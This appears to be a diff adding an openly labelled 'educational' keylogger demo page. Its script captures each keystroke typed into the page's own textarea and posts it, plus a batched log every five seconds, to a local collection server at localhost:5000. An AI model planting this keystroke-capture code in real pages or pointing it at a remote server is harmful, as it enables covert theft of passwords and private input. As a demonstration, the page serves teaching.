@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Demo</title>
+</head>
+<body>
+    <h1>Keylogger Demo (Educational Purpose)</h1>
+    <p>Type anything in the box below:</p>
+    <textarea id="keylogger-box" rows="10" cols="50"></textarea>
+
+    <script>
+        // Function to send data to the server
+        async function sendData(keyData) {
+            try {
+                await fetch('http://localhost:5000/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ keyData: keyData })
+                });
+            } catch (error) {
+                console.error('Error sending data to the server:', error);
+            }
+        }
+
+        // Capture keystrokes
+        const keyloggerBox = document.getElementById('keylogger-box');
+        let log = '';
+
+        keyloggerBox.addEventListener('keydown', (event) => {
+            log += event.key;
+            sendData(event.key); // Send each key to the server in real-time
+        });
+
+        // Optionally, send the full log at intervals
+        setInterval(() => {
+            if (log) {
+                sendData(log);
+                log = ''; // Clear the log after sending
+            }
+        }, 5000); // Send logs every 5 seconds
+    </script>
+</body>
+</html>
